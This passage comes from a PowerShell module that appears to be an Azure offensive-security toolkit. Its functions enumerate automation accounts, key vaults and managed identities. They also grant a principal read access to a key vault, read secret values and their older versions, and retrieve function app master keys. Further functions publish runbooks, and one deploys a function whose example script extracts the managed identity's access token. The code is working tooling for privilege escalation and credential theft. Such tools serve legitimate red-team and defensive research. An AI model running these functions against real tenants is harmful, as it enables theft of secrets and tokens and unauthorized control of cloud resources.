    C:\PS> $AutomationAccounts = Get-AllAzureRMAutomationAccounts -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all Automation Accounts under the subscription with ID starting with "839..." and put them into the $AutomationAccounts variable
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Automation Accounts under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $AutomationAccountObjects += $Results.value
        } else {
            $AutomationAccountObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $AutomationAccountObjects

}

Function Get-AllAzureRMKeyVaults {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Key Vaults under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Key Vaults under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Key Vaults

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list Key Vaults under
    
    .EXAMPLE
    C:\PS> $KeyVaults = Get-AllAzureRMKeyVaults -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all Key Vaults under the subscription with ID starting with "839..." and put them into the $KeyVaults variable
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Key Vaults under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.KeyVault/vaults?api-version=2021-10-01"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $KeyVaultObjects += $Results.value
        } else {
            $KeyVaultObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $KeyVaultObjects

}

Function New-AzureKeyVaultAccessPolicy {
    <#
    .SYNOPSIS
        Grant a principal the "Get" and "List" permissions across secrets, keys, and certificates on a particular key vault.

        TODO: Let the user specify with more granulaity what permissions they want to add.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Grant a principal the "Get" and "List" permissions across secrets, keys, and certificates on a particular key vault. You must wait at least 2 minutes before using the new access policy privilege: https://docs.microsoft.com/en-us/azure/key-vault/general/rbac-guide?tabs=azure-cli#known-limits-and-performance

    .PARAMETER PrincipalID
        The object ID of the existing AAD principal to which you are granting the Azure Key Vault access

    .PARAMETER TenantID
        The unique identifier of the AzureAD tenant the principal resides in

    .PARAMETER TargetObjectID
        The ID of the Azure Key Vault you are granting the access policy against

    .PARAMETER Token
        The AzureRM scoped JWT for a principal with the ability to add a new access policy to the target key vault

    .EXAMPLE
        C:\PS> New-AzureKeyVaultAccessPolicy `
            -TargetObjectID "/subscriptions/7c669b03-41d0-4ed6-ac55-806bdcdfa84a/resourceGroups/KeyVaults/providers/Microsoft.KeyVault/vaults/KeyVault-01" `
            -TenantID "d5ba96aa-6cf5-4a9e-a942-a949834d1e85" `
            -PrincipalID "80634281-d7ea-4361-837c-22222637af9e" `
            -Token $Token

        Description
        -----------
        Give the principal with ID starting with "8063...", which resides in the tenant with ID starting with "d5ba...", "Get" and "List" access on the key vault "KeyVault-01"

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TenantID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $Body = @{
      properties = @{
        accessPolicies = @(
          @{
            tenantId = $TenantID
            objectId = $PrincipalID
            permissions = @{
              keys = @(
                "get"
                "list"
              )
              secrets = @(
                "get"
                "list"
              )
              certificates = @(
                "get"
                "list"
              )
            }
          }
        )
      }
    }

    $URI = "https://management.azure.com$($TargetObjectID)/accessPolicies/add?api-version=2021-10-01"

    $AddKeyVaultReadAccess = Invoke-RestMethod `
        -URI $URI `
        -Method PUT `
        -Headers @{
            Authorization = "Bearer $($Token)"
        } `
        -ContentType "application/json" `
        -Body ($Body | ConvertTo-Json -Depth 5)

    $AddKeyVaultReadAccess

}

Function Get-AzureRMKeyVaultSecrets {
    <#
    .SYNOPSIS
        Lists available key vault secrets from a specified key vault. Returns IDs of secrets but not the secret itself.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Lists available key vault secrets from a specified key vault. Returns IDs of secrets but not the secret itself.

    .PARAMETER KeyVaultURL
        The URL of the target Key Vault

    .PARAMETER Token
        The Azure Key Vault service scoped JWT for a principal with the ability to list key vault secrets against the target Key Vault

    .EXAMPLE
        C:\PS> Get-AzureRMKeyVaultSecrets `
            -KeyVaultURL "https://keyvault-01.vault.azure.net" `
            -Token $KVToken

        Description
        -----------
        List the secrets stored in the key vault called keyvault-01

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyVaultURL,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "$($KeyVaultURL)/secrets?api-version=7.3" 

    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $KeyVaultSecrets += $Results.value
        } else {
            $KeyVaultSecrets += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $KeyVaultSecrets

}

Function Get-AzureRMKeyVaultSecretValue {
    <#
    .SYNOPSIS
        Gets the value of a specific Key Vault secret. You can optionally specify a secret version by appending this to the secret ID URL.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Gets the value of a specific Key Vault secret.

    .PARAMETER KeyVaultSecretID
        The URL of the target Key Vault secret

    .PARAMETER Token
        The Azure Key Vault service scoped JWT for a principal with the ability to read the value of secrets from the specified vault

    .EXAMPLE
        C:\PS> New-AzureRMKeyVaultSecretValue `
            -KeyVaultSecretID "https://keyvault-01.vault.azure.net/secrets/My-secret-value" `
            -Token $Token

        Description
        -----------
        Read the secret value of "My-secret-value" within the "keyvault-01" vault

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyVaultSecretID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "$($KeyVaultSecretID)/?api-version=7.0"

    $KeyVaultSecretValue = Invoke-WebRequest `
        -UseBasicParsing `
        -URI $URI `
        -Headers @{
            "Authorization"="Bearer $($Token)"
        } `
        -Method GET

    $KeyVaultSecretValue.Content | ConvertFrom-JSON

}

Function Get-AzureRMKeyVaultSecretVersions {
    <#
    .SYNOPSIS
        Gets all versions of a specified Key Vault secret. You can retrieve historical secrets
        by specifying the historical ID and feeding that to Get-AzureRMKeyVaultSecretValue

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Gets all versions of a specified Key Vault secret. You can retrieve historical secrets
        by specifying the historical ID and feeding that to Get-AzureRMKeyVaultSecretValue

    .PARAMETER KeyVaultSecretID
        The URL of the target Key Vault secret

    .PARAMETER Token
        The Azure Key Vault service scoped JWT for a principal with the ability to read the value of secrets from the specified vault

    .EXAMPLE
        C:\PS> Get-AzureRMKeyVaultSecretVersions `
            -KeyVaultSecretID "https://keyvault-01.vault.azure.net/secrets/My-cool-secret" `
            -Token $Token

        Description
        -----------
        List the versions for the "My-cool-secret" secret within the "keyvault-01" vault

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyVaultSecretID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "$($KeyVaultSecretID)/versions?api-version=7.0"

    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $KeyVaultSecretVersions += $Results.value
        } else {
            $KeyVaultSecretVersions += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $KeyVaultSecretVersions

}

Function Get-AllAzureManagedIdentityAssignments {
    <#
    .SYNOPSIS
        Scans all supported Azure resource types for managed identity assignments
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Scans all supported Azure resource types for managed identity assignments. Supported resource types
        include Virtual Machines, Logic Apps, Function Apps, ACR Tasks, and Automation Accounts. Depending
        on the resource type, managed identity assignments will include system-assigned, user-assigned, and
        Run As accounts.
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability read all of the above-mentioned Azure resource types

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to scan for Managed Identity assignments
    
    .EXAMPLE
    C:\PS> $ManagedIdentityAssignments = Get-AllAzureManagedIdentityAssignments -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to scan the "839..." subscription for all Azure resources with managed identity assignments
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all VMs
    $VirtualMachines = Get-AllAzureRMVirtualMachines -Token $Token -SubscriptionID $SubscriptionID

    # Get all Logic Apps
    $LogicApps = Get-AllAzureRMLogicApps -Token $Token -SubscriptionID $SubscriptionID

    # Get all Function Apps
    $FunctionApps = Get-AllAzureRMFunctionApps -Token $Token -SubscriptionID $SubscriptionID

    # Get all ACRs
    $ContainerRegistries = Get-AllAzureRMAzureContainerRegistries -Token $Token -SubscriptionID $SubscriptionID

    # Get all Automation Accounts
    $AutomationAccounts = Get-AllAzureRMAutomationAccounts -Token $Token -SubscriptionID $SubscriptionID

    # Process Virtual Machines
    $VirtualMachines | %{
        $VM = $_
    
        # Output an object if there is a system-assigned managed identity:
        If ($VM.identity.principalId -eq $null) {
        } else {
    
            $ManagedIdentityAssignment = New-Object PSObject -Property @{
                ResourceType        = "Virtual Machine"
                ManagedIdentityType = "System Assigned"
                ResourceName        = $VM.name
                ResourceID          = $VM.id
                ServicePrincipalID  = $VM.identity.principalId
            }
    
            $ManagedIdentityAssignment
    
        }
    
        # Virtual Machines can have multiple user-assigned managed identity assignments.
        # Output one object per user-assigned managed identity:
        If ($VM.identity.userAssignedIdentities -eq $null) {
        } else {
            # Count how many user-assigned identities there are:
            $UserAssignedIdentityCount = ($VM.identity.userAssignedIdentities.PSObject.Properties | measure).Count
    
            # Loop through the VM object for the number of user assigned identities there are:
            1..$UserAssignedIdentityCount | %{
                $CurrentInteger = $_
    
                $ManagedIdentityAssignment = New-Object PSObject -Property @{
                    ResourceType        = "Virtual Machine"
                    ManagedIdentityType = "User Assigned"
                    ResourceName        = $VM.name
                    ResourceID          = $VM.id
                    ServicePrincipalID  = ($VirtualMachines.identity.userAssignedIdentities.PSObject.Properties | Select-Object -First $CurrentInteger | Select-Object -Last 1 | select -expand Value).principalId
                }
    
            $ManagedIdentityAssignment
    
            }
        }
    }
    
    # Process Logic Apps
    $LogicApps | %{
        $LogicApp = $_
    
        # Output an object if there is a system-assigned managed identity:
        If ($LogicApp.identity.principalId -eq $null) {
        } else {
    
            $ManagedIdentityAssignment = New-Object PSObject -Property @{
                ResourceType        = "Logic App"
                ManagedIdentityType = "System Assigned"
                ResourceName        = $LogicApp.name
                ResourceID          = $LogicApp.id
                ServicePrincipalID  = $LogicApp.identity.principalId
            }
    
            $ManagedIdentityAssignment
    
        }
    
        # Logic Apps can only have one managed identity assignment at a time
        # Output an if there is a user-assigned managed identity:
        If ($LogicApp.identity.userAssignedIdentities -eq $null) {
        } else {
            $ManagedIdentityAssignment = New-Object PSObject -Property @{
                ResourceType        = "Logic App"
                ManagedIdentityType = "User Assigned"
                ResourceName        = $LogicApp.name
                ResourceID          = $LogicApp.id
                ServicePrincipalID  = ($LogicApp.identity.userAssignedIdentities.PSObject.Properties | select -expand Value).principalId
            }
    
            $ManagedIdentityAssignment
    
        }
    }
    
    # Process Function Apps
    $FunctionApps | %{
        $FunctionApp = $_
    
        # Output an object if there is a system-assigned managed identity:
        If ($FunctionApp.identity.principalId -eq $null) {
        } else {
    
            $ManagedIdentityAssignment = New-Object PSObject -Property @{
                ResourceType        = "Function App"
                ManagedIdentityType = "System Assigned"
                ResourceName        = $FunctionApp.name
                ResourceID          = $FunctionApp.id
                ServicePrincipalID  = $FunctionApp.identity.principalId
            }
    
            $ManagedIdentityAssignment
    
        }
    
        # Function Apps can have multiple user-assigned managed identity assignments.
        # Output one object per user-assigned managed identity:
        If ($FunctionApp.identity.userAssignedIdentities -eq $null) {
        } else {
            # Count how many user-assigned identities there are:
            $UserAssignedIdentityCount = ($FunctionApp.identity.userAssignedIdentities.PSObject.Properties | measure).Count
    
            # Loop through the FunctionApp object for the number of user assigned identities there are:
            1..$UserAssignedIdentityCount | %{
                $CurrentInteger = $_
    
                $ManagedIdentityAssignment = New-Object PSObject -Property @{
                    ResourceType        = "Function App"
                    ManagedIdentityType = "User Assigned"
                    ResourceName        = $FunctionApp.name
                    ResourceID          = $FunctionApp.id
                    ServicePrincipalID  = ($FunctionApps.identity.userAssignedIdentities.PSObject.Properties | Select-Object -First $CurrentInteger | Select-Object -Last 1 | select -expand Value).principalId
            }
    
            $ManagedIdentityAssignment
    
            }
        }
    }
    
    # Process Container Registries
    $ContainerRegistries | %{
        $ContainerRegistry = $_
    
        # The original CR object doesn't contain MI assignments, we need to make another API request per CR to get those:
        $ContainerRegistryManagedIdentities = (
            Invoke-WebRequest -UseBasicParsing -Uri "https://management.azure.com/api/invoke" `
                -Headers @{
                    "Authorization"="Bearer $($Token)"
                    "x-ms-path-query"="$($ContainerRegistry.id)?api-version=2020-11-01-preview"
                } `
                -ContentType "application/json"
        ).Content | ConvertFrom-JSON
    
        # Output an object if there is a system-assigned managed identity:
        If ($ContainerRegistryManagedIdentities.identity.principalId -eq $null) {
        } else {
    
            $ManagedIdentityAssignment = New-Object PSObject -Property @{
                ResourceType        = "Container Registry"
                ManagedIdentityType = "System Assigned"
                ResourceName        = $ContainerRegistry.name
                ResourceID          = $ContainerRegistry.id
                ServicePrincipalID  = $ContainerRegistryManagedIdentities.identity.principalId
            }
    
            $ManagedIdentityAssignment
    
        }
    
        # Container Registries can have multiple user-assigned managed identity assignments.
        # Output one object per user-assigned managed identity:
        If ($ContainerRegistryManagedIdentities.identity.userAssignedIdentities -eq $null) {
        } else {
            # Count how many user-assigned identities there are:
            $UserAssignedIdentityCount = ($ContainerRegistryManagedIdentities.identity.userAssignedIdentities.PSObject.Properties | measure).Count
    
            # Loop through the ContainerRegistryManagedIdentities object for the number of user assigned identities there are:
            1..$UserAssignedIdentityCount | %{
                $CurrentInteger = $_
    
                $ManagedIdentityAssignment = New-Object PSObject -Property @{
                    ResourceType        = "Container Registry"
                    ManagedIdentityType = "User Assigned"
                    ResourceName        = $ContainerRegistry.name
                    ResourceID          = $ContainerRegistry.id
                    ServicePrincipalID  = ($ContainerRegistryManagedIdentities.identity.userAssignedIdentities.PSObject.Properties | Select-Object -First $CurrentInteger | Select-Object -Last 1 | select -expand Value).principalId
            }
    
            $ManagedIdentityAssignment
    
            }
        }
    }
    
    # Process Automation Accounts
    $AutomationAccounts | %{
        $AutomationAccount = $_
    
        # Output an object if there is a system-assigned managed identity:
        If ($AutomationAccount.identity.principalId -eq $null) {
        } else {
    
            $ManagedIdentityAssignment = New-Object PSObject -Property @{
                ResourceType        = "Automation Account"
                ManagedIdentityType = "System Assigned"
                ResourceName        = $AutomationAccount.name
                ResourceID          = $AutomationAccount.id
                ServicePrincipalID  = $AutomationAccount.identity.principalId
            }
    
            $ManagedIdentityAssignment
    
        }
    
        # Automation Accounts can have multiple user-assigned managed identity assignments.
        # Output one object per user-assigned managed identity:
        If ($AutomationAccount.identity.userAssignedIdentities -eq $null) {
        } else {
            # Count how many user-assigned identities there are:
            $UserAssignedIdentityCount = ($AutomationAccount.identity.userAssignedIdentities.PSObject.Properties | measure).Count
    
            # Loop through the AutomationAccount object for the number of user assigned identities there are:
            1..$UserAssignedIdentityCount | %{
                $CurrentInteger = $_
    
                $ManagedIdentityAssignment = New-Object PSObject -Property @{
                    ResourceType        = "Automation Account"
                    ManagedIdentityType = "User Assigned"
                    ResourceName        = $AutomationAccount.name
                    ResourceID          = $AutomationAccount.id
                    ServicePrincipalID  = ($AutomationAccount.identity.userAssignedIdentities.PSObject.Properties | Select-Object -First $CurrentInteger | Select-Object -Last 1 | select -expand Value).principalId
            }
    
            $ManagedIdentityAssignment
    
            }
        }
    }

}

Function ConvertTo-Markdown {
    <#
    .Synopsis
        Converts a PowerShell object to a Markdown table.

        Author: Ben Neise (@BenNeise)
    .EXAMPLE
        $data | ConvertTo-Markdown
    .EXAMPLE
        ConvertTo-Markdown($data)
    .LINK
        https://twitter.com/BenNeise
        https://gist.github.com/BenNeise/4c837213d0f313715a93
    #>
    [CmdletBinding()]
    [OutputType([string])]
    Param (
        [Parameter(
            Mandatory = $true,
            Position = 0,
            ValueFromPipeline = $true
        )]
        [PSObject[]]$collection
    )

    Begin {
        $items = @()
        $columns = @{}
    }

    Process {
        ForEach($item in $collection) {
            $items += $item

            $item.PSObject.Properties | %{
                if(-not $columns.ContainsKey($_.Name) -or $columns[$_.Name] -lt $_.Value.ToString().Length) {
                    $columns[$_.Name] = $_.Value.ToString().Length
                }
            }
        }
    }

    End {
        ForEach($key in $($columns.Keys)) {
            $columns[$key] = [Math]::Max($columns[$key], $key.Length)
        }

        $header = @()
        ForEach($key in $columns.Keys) {
            $header += ('{0,-' + $columns[$key] + '}') -f $key
        }
        $header -join ' | '

        $separator = @()
        ForEach($key in $columns.Keys) {
            $separator += '-' * $columns[$key]
        }
        $separator -join ' | '

        ForEach($item in $items) {
            $values = @()
            ForEach($key in $columns.Keys) {
                $values += ('{0,-' + $columns[$key] + '}') -f $item.($key)
            }
            $values -join ' | '
        }
    }
}

Function New-PowerShellFunctionAppFunction {
    <#
    .SYNOPSIS
        Create a new function in an existing Function App. The function must be a PowerShell formatted script.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Create a new function in an existing Function App

    .PARAMETER Token
        The AzureRM-scoped JWT for principal with the ability to add a function to the target function app

    .PARAMETER PathToFunctionApp
        The full URI path to the target function app

    .PARAMETER FunctionName
        The name of the new function you are adding to the function app

    .PARAMETER PowerShellScript
        The PowerShell script you want the new function to execute

    .EXAMPLE
        C:\PS> $Script = '
            using namespace System.Net
            param($Request, $TriggerMetadata)
            $resourceURI = "https://graph.microsoft.com/"
            $tokenAuthURI = $env:MSI_ENDPOINT + "?resource=$resourceURI&api-version=2017–09–01"
            $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI
            Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
            StatusCode = [HttpStatusCode]::OK
            Body = $tokenResponse
        })
        '

        C:\PS> New-PowerShellFunctionAppFunction `
            -Token $ServicePrincipalBToken `
            -PathToFunctionApp "https://management.azure.com/subscriptions/bf510275-8a83-4932-988f-1b148b83f832/resourceGroups/BHE_SpecterDev_FA_RG/providers/Microsoft.Web/sites/MyCoolFunctionApp" `
            -FunctionName "NewFunction3" `
            -PowerShellScript $Script 

        Description
        -----------
        Add a function to "MyCoolFunctionApp" which will extract a JWT for the function app's managed identity service principal

    .LINK
        https://medium.com/p/300065251cbe
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PathToFunctionApp,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $FunctionName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PowerShellScript
    )

    $URI = "$($PathToFunctionApp)/functions/$($FunctionName)?api-version=2018-11-01"
    
    $Body = @{
        id = "$($PathToFunctionApp)/functions/$($FunctionName)"
        properties = @{
            name = $FunctionName
            files = @{
                "run.ps1" = $PowerShellScript
            }
            test_data = "asdf"
            config = @{
                bindings = @(
                    @{
                        authLevel = "function"
                        type = "httpTrigger"
                        direction = "in"
                        name = "Request"
                        methods = @(
                            "get"
                            "post"
                        )
                    }
                    @{
                        type = "http"
                        direction = "out"
                        name = "Response"
                    }
                )
            }
        }
    } | ConvertTo-Json -Depth 5
   
    Try {
        $CreateFunction = Invoke-RestMethod `
            -Method PUT `
            -URI $URI `
            -Body $Body `
            -Headers @{
                "authorization"="Bearer $($Token)"
            } `
            -ContentType "application/json"
        $Success = $True
    }
    Catch {
        $_
    }
}

Function Get-AzureFunctionAppMasterKeys {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM Function App objects under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM Function App objects under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Function App master keys

    .PARAMETER PathToFunctionApp
        The full URL path to the function app

    .EXAMPLE
        Get-AzureFunctionAppMasterKeys `
            -Token $ARMToken `
            -PathToFunctionApp "https://management.azure.com/subscriptions/f5e4c53c-7ff4-41ec-ad4a-00f512eb2dcf/resourceGroups/BHE_SpecterDev_FA_RG/providers/Microsoft.Web/sites/MyCoolFunctionApp"

        Retrieve the master key for "MyCoolFunctionApp"

    .LINK
        https://medium.com/p/300065251cbe

    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PathToFunctionApp
    )

    # Get the Master Key for the specified Function App
    $Request = Invoke-WebRequest -URI "$($PathToFunctionApp)/host/default/listkeys?api-version=2018-11-01" `
        -Method "POST" `
        -Headers @{
            "Authorization"="Bearer $($Token)"
        } 
        
        $FunctionAppMasterKey = ($Request.Content | ConvertFrom-JSON).masterKey

    $FunctionAppMasterKey

}

Function Get-AzureFunctionOutput {
    <#
    .SYNOPSIS
        Retrieves the output of a specified Function App function
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves the output of a specified Function App function
    
    .PARAMETER FunctionKey
        The function-specific key or function app master key

    .PARAMETER FunctionURL
        The full URL path to the function app function

    .EXAMPLE
        Get-AzureFunctionOutput `
            -FunctionKey $FunctionAppMasterKey `
            -PathToFunctionApp "https://management.azure.com/subscriptions/f5e4c53c-7ff4-41ec-ad4a-00f512eb2dcf/resourceGroups/BHE_SpecterDev_FA_RG/providers/Microsoft.Web/sites/MyCoolFunctionApp"

        Trigger and get output from MyCoolFunctionApp

    .LINK
        https://medium.com/p/300065251cbe
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $FunctionKey,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $FunctionURL
    )

    # Get the Master Key for the specified Function App
    $Request = Invoke-WebRequest -URI "$($FunctionURL)?code=$($FunctionKey)" `
        -Method "GET"

    $Request.Content

}

Function New-AzureAutomationAccountRunBook {
    <#
    .SYNOPSIS
        Add a runbook to an existing Automation Account

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Add a runbook to an existing Automation Account

    .PARAMETER Token
        The AzureRM-scoped JWT for the test principal

    .PARAMETER RunBookName
        The name you want to give to the new runbook

    .PARAMETER AutomationAccountPath
        TThe full URL path to the Automation Account

    .EXAMPLE
        C:\PS> New-AzureAutomationAccountRunBook `
            -Token $ARMToken `
            -RunBookName "MyCoolRunBook" `
            -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"

        Description
        -----------
        Publish a new runbook to an existing automation account called "MyCoolAutomationAccount"

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AutomationAccountPath,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $RunBookName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Script
    )
    
    Try {
        $RequestGUID = ([GUID]::NewGuid()).toString()
        $body = @{
            requests = @(
                @{
                    content = @{
                        name = $RunBookName
                        location = "eastus"
                        properties = @{
                            runbookType = "PowerShell7"
                            description = "asdf"
                            logProgress = "false"
                            logVerbose = "false"
                            draft = @{}
                        }
                    }
                    httpMethod = "PUT"
                    name = $RequestGUID
                    requestHeaderDetails = @{
                        commandName = "Microsoft_Azure_Automation."
                    }
                    url = "$($AutomationAccountPath)/runbooks/$($RunBookName)?api-version=2017-05-15-preview"
                }
            )
        }
        $CreateDraft = Invoke-RestMethod `
            -Uri "https://management.azure.com/batch?api-version=2020-06-01" `
            -Method "POST" `
            -Headers @{Authorization = "Bearer $($Token)"} `
            -ContentType "application/json" `
            -Body $($body |ConvertTo-Json -depth 5)

        # Add script to the runbook
        $URI = "$($AutomationAccountPath)/runbooks/$($RunBookName)/draft/content?api-version=2015-10-31"
        $Request = $null
        $Request = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($Token)"} `
            -URI $URI `
            -Method PUT `
            -Body $Script `
            -ContentType "text/powershell"

        # Publish the runbook
        $RequestGUID = ([GUID]::NewGuid()).toString()
        $body = @{
            requests = @(
                @{
                    httpMethod = "POST"
                    name = $RequestGUID
                    requestHeaderDetails = @{
                        commandName = "Microsoft_Azure_Automation."
                    }
                    url = "$($AutomationAccountPath)/runbooks/$($RunBookName)/publish?api-version=2018-06-30"
                }
            )
        }
        Invoke-RestMethod `
            -Uri "https://management.azure.com/batch?api-version=2020-06-01" `
            -Method "POST" `
            -Headers @{Authorization = "Bearer $($Token)"} `
            -ContentType "application/json" `
            -Body $($body |ConvertTo-Json -depth 3)
    }
    Catch {
        $_
    }
}

Function Get-AzureAutomationAccountRunBookOutput {
    <#
    .SYNOPSIS
        Run an existing Automation Account runbook and retrieve its output

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

